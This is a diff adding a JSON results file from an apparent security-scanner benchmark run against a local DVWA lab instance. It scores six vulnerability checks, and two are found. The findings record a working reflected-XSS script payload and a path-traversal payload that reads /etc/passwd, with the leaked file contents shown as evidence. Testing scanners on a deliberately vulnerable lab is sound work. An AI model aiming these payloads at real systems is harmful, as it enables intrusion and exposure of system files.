@@ -1,0 +1,119 @@
+{
+  "label": "dvwa-low",
+  "hit": 2,
+  "expected": 6,
+  "results": [
+    {
+      "name": "SQL injection (error)",
+      "endpoint": "http://127.0.0.1:8081/vulnerabilities/sqli/",
+      "param": "id",
+      "position": "query",
+      "expect": [
+        "sqli"
+      ],
+      "found": [],
+      "hit": false,
+      "seconds": 0.024,
+      "findings": []
+    },
+    {
+      "name": "SQL injection (blind)",
+      "endpoint": "http://127.0.0.1:8081/vulnerabilities/sqli_blind/",
+      "param": "id",
+      "position": "query",
+      "expect": [
+        "sqli"
+      ],
+      "found": [],
+      "hit": false,
+      "seconds": 0.021,
+      "findings": []
+    },
+    {
+      "name": "XSS reflected",
+      "endpoint": "http://127.0.0.1:8081/vulnerabilities/xss_r/",
+      "param": "name",
+      "position": "query",
+      "expect": [
+        "xss"
+      ],
+      "found": [
+        "xss"
+      ],
+      "hit": true,
+      "seconds": 0.024,
+      "findings": [
+        {
+          "vuln_type": "xss",
+          "url": "http://127.0.0.1:8081/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27sentinelXSS9137%27%29%3C%2Fscript%3E",
+          "severity": "high",
+          "method": "GET",
+          "param": "name",
+          "payload": "<script>alert('sentinelXSS9137')</script>",
+          "evidence": "ello <script>alert('sentinelXSS9137')</script></pre>\r\n\t</div>\r\n\r\n\t<h2>More Information</h2>\r\n\t<",
+          "proof": "载荷未经过 HTML 实体编码直接回显到响应体",
+          "confidence": 0.92,
+          "created_at": 1792380346.1709723
+        }
+      ]
+    },
+    {
+      "name": "Command injection",
+      "endpoint": "http://127.0.0.1:8081/vulnerabilities/exec/",
+      "param": "ip",
+      "position": "query",
+      "expect": [
+        "rce",
+        "cmd",
+        "command"
+      ],
+      "found": [],
+      "hit": false,
+      "seconds": 0.005,
+      "findings": []
+    },
+    {
+      "name": "File inclusion (LFI)",
+      "endpoint": "http://127.0.0.1:8081/vulnerabilities/fi/",
+      "param": "page",
+      "position": "query",
+      "expect": [
+        "file_read",
+        "lfi",
+        "traversal"
+      ],
+      "found": [
+        "file_read"
+      ],
+      "hit": true,
+      "seconds": 0.026,
+      "findings": [
+        {
+          "vuln_type": "file_read",
+          "url": "http://127.0.0.1:8081/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "severity": "high",
+          "method": "GET",
+          "param": "page",
+          "payload": "../../../../../../../../../../etc/passwd",
+          "evidence": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbi",
+          "proof": "路径穿越成功读取系统敏感文件",
+          "confidence": 0.95,
+          "created_at": 1792380346.2068768
+        }
+      ]
+    },
+    {
+      "name": "Reflected XSS (xss_d)",
+      "endpoint": "http://127.0.0.1:8081/vulnerabilities/xss_d/",
+      "param": "default",
+      "position": "query",
+      "expect": [
+        "xss"
+      ],
+      "found": [],
+      "hit": false,
+      "seconds": 0.006,
+      "findings": []
+    }
+  ]
+}
